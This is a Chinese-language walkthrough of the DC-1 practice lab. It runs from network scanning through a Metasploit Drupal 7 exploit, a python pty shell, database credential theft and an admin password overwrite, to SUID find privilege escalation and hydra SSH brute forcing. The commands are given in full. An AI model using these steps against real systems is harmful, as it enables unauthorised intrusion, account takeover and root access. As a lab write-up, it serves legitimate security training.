一、信息收集

1、arp-scan -l 查看同网段所有主机

可以猜测目标靶机ip应该是192.168.47.131

因为192.168.47.254应当是网关

2、使用nmap扫描目标主机开放端口

nmap -A -p- 192.168.47.131

知道目标靶机开放了22、80、111、37313端口，得知目标靶机有web服务

在本机访问目标靶机的web服务页面

3、借助火狐wappalyzer插件查看该网站框架

可以知道该网站使用的是Dmpal7的CMS搭建。

4、利用mfs搜索相关漏洞

  • 在启动msf前先使用mfsdb init 初始化mfs数据库

  • msfconsole启动msf

  • 在mfs中搜索drupal7相关漏洞，search drupal 7.x 发现一可利用脚本

二、漏洞利用

1、使用mfs中发现的可利用脚本

  • use 0 选择使用该脚本
  • options查看脚本的参数信息
  • 配置RHOSTS,set rhosts 192.168.47.131
  • 配置完成输入run即可进入DC1的shell环境
  • 此时我们依旧没有得到一个完整的shell，所以我们需要使用python中的pty模块反弹一个完整的shell，python -c ‘import pty;pty.spawn(“/bin/bash”)’

2、拿到shell进行命令执行

  • 先whoami查看当前路径；

  • ls发现有flag1.txt文件，cat flag1.txt查看文件内容为Every good CMS needs a config file - and so do you.（任何一个完善的CMS都需要配置文件——所以你需要怎么做）；这里是在提示我去找配置文件

  • 直接find ./ -type f ( -name “.php” -o -name “.txt” ) -print0 | xargs -0 grep -i “flag2”搜flag2

​ 此命令意思是查找当前目录及其递归目录下所有文件php和txt文件中包含flag2的文件![DC1_10 ](/images/DC1_10 .png)

  • 在/var/www/sites/default目录下发现了settings.php文件
  • 在这个文件中我们除了发现了flag2的内容，还发现了数据库的用户名、密码

3、连接数据库，修改密码

  • 接下来我们尝试去连接数据库
  • 连接成功后我们一步步查看，先show databases;查看库名,再use drupaldb;选择库,进入库后show tables;查看表，接着看到了有users表，select * from users;查看表的内容
  • 可以看到有用户名admin，但是密码是加盐的，一般加盐密码很难破解，故而我们选择修改密码；首先退出mysql，在/var/www目录下执行php scripts/password-hash.sh 123456生成加盐密码
  • 重新进去mysql数据库，修改密码update users set pass=”$S$DTShtGpARMmjeGTPEGoZYcOz8HD9us8wNzTEuGv1hgZIWlMHFcJ8” where uid=1;

4、登陆web页面

  • 用admin/123456登陆网站，得到flag3
  • flag3的内容为“特殊的权限将有助于你用 find 命令找到 passwd 文件——但你还需要借助 -exec 参数来执行命令，从而找出如何获取 shadow 文件中的内容。”这个提示我们接下来去查看shadow文件，还需要提权

5、提权

  • 通过flag3的提示，让我们去看一下/etc/passwd内容，发现有一个flag4的用户
  • 进入flag4家目录下，ls看一下发现有flag4.txt，cat看一下，内容是让提权到root
  • find / -perm -u=s -type f 2>/dev/null 看一下谁有权限，看到find了
  • find / -name index.php -exec “/bin/sh” ;使用find提权，拿到权限获得flag

注：也可以ssh远控flag4用户，使用hydra -l flag4 -P /usr/share/john/password.lst 192.168.47.131 ssh -vV -f 爆破出来ssh密码是orange

使用ssh flag4@192.168.47.131远程连接

再继续find提权find / -perm -4000 2>/dev/null查一下，有find，输入find -exec /bin/sh ;提权。
